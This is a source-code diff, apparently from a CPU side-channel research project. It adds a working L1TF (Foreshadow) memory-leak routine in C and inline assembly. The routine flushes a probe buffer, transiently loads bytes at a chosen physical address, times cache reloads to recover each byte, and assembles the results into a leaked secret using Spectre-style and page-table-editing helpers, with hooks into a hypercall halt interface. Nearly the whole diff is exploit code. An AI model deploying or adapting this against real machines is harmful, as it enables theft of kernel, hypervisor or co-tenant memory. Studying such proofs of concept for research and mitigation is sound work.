@@ -598,10 +598,107 @@ int l1tf_main(int argc, char *argv[argc]) {
 ////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////
 
+typedef char rbuf_t[256][STRIDE];
+static __attribute__((aligned(PAGE_SIZE))) rbuf_t rbuf;
 static __attribute__((aligned(PAGE_SIZE))) two_byte_reload_buffer rbuf16;
 static leak_addr_t leak_addr;
 static int halt_counter = 1;
 static int fd_halt = -1;
+static int hit[256];
+
+#define BYTE_START 0x0
+#define BYTE_END  0x100
+
+static void rbuf_flush(void)
+{
+  for (int i = BYTE_START; i < BYTE_END; i++)
+    clflush(rbuf[i]);
+}
+
+static void l1tf_core(char *leak) {
+  __asm__ volatile(
+    "xor %%rax, %%rax \n"
+    "mov %[stride], %%rcx \n"
+    "movl $0xB1ABE849, %%r12d \n"
+    "movl $0xCD7E16F1, %%r13d \n"
+    "leaq handler%=(%%rip), %%r14 \n"
+    "movb (%[leak]), %%al \n"
+    "mul %%rcx \n"
+    "movb (%[rbuf], %%rax), %%al \n"
+    "mfence \n"
+    "handler%=:"
+    :
+    :[leak] "r"(leak), [rbuf] "r"(rbuf), [stride] "i"(STRIDE)
+    : "rax", "rcx", "rdx", "r12", "r13", "r14", "cc"
+  );
+}
+
+static void rbuf_reload(void)
+{
+  static int lc = 0;
+  for (int i = BYTE_END-1; i >= BYTE_START; i--) {
+    if (access_time(rbuf[i]) < THRESHOLD) {
+      hit[i]++;
+      if (i > 0) printf("lc = %8d | hit at %2x\n", lc, i);
+    }
+  }
+  lc++;
+}
+
+static int hit_analyze(void)
+{
+  const int verbose = 1;
+  if (verbose) {
+    for (int i = 0; i < 256; i++)
+      if (hit[i] > 0)
+        printf("hit[%02x] = %d\n", i, hit[i]);
+    printf("\n");
+  }
+
+  int r = max_idx(&hit[1], 255) + 1;
+  if (hit[r])
+    return r;
+  return hit[0] ? 0 : -1;
+}
+
+int do_l1tf_leak(char *leak) {
+  memset(hit, 0, sizeof(hit));
+  int attempt = 0;
+  do {
+    rbuf_flush();
+    for (int r = 0; r < 2; r++)
+      assert(write(fd_halt, NULL, 0) == 0);
+    for (int i = 0; i < 4500; i++)
+      l1tf_core(leak);
+    rbuf_reload();
+  } while (attempt++ < 1000);
+  return hit_analyze();
+}
+
+char *l1tf_leak(uintptr_t base, uintptr_t pa, int nr_bytes)
+{
+  assert(0 < nr_bytes && nr_bytes <= 64 && (pa & (64-1)) + nr_bytes <= 64);
+
+  // uint64_t bla = 0x0123456789abcdef;
+
+  half_spectre_start(base, pa);
+
+  l1tf_leak_buffer_modify(&leak_addr, pa);
+
+  char *secret = malloc(nr_bytes);
+  memset(secret, 0, nr_bytes);
+
+  for (int i = 0; i < nr_bytes; i++) {
+    printf("l1tf_leak: at byte %d\n", i);
+    char *leak = leak_addr.leak + (((pa + i) & 0xfff));
+    secret[i] = do_l1tf_leak(leak);
+    // secret[i] = do_l1tf_leak((char *)&bla + i);
+  }
+
+  half_spectre_stop();
+
+  return secret;
+}
 
 static int l1tf_oracle16(uint16_t magic, uintptr_t pa, int nr_tries, void *touch) {
   l1tf_leak_buffer_modify(&leak_addr, pa);
@@ -650,7 +747,7 @@ int l1tf_test_base(uintptr_t pa, int iters)
 
 uintptr_t l1tf_find_page_pa(void *p)
 {
-  const int verbose = 2;
+  const int verbose = 1;
 
 #if DEBUG
   uintptr_t real_pa = helper_find_page_pa(p);
@@ -697,7 +794,7 @@ uintptr_t l1tf_find_page_pa(void *p)
 
 uintptr_t l1tf_find_base(void)
 {
-  const int verbose = 2;
+  const int verbose = 1;
 
 #if DEBUG
   uintptr_t real_pa = helper_base_pa();
@@ -737,14 +834,14 @@ uintptr_t l1tf_find_base(void)
   }
   spectre_touch_base_stop();
   l1tf_leak_buffer_modify(&leak_addr, leak_addr.original_pfn << 12);
-  ptedit_cleanup();
   return -1;
 }
 
 void l1tf_init(void)
 {
   initialize_pteditor_lib();
-  memset(rbuf16, 0x42, sizeof(rbuf16));
+  memset(rbuf, 0x97, sizeof(rbuf));
+  memset(rbuf16, 0x97, sizeof(rbuf16));
   leak_addr = l1tf_leak_buffer_create();
   fd_halt = open("/proc/hypercall/halt", O_WRONLY);
   assert(fd_halt > 0);
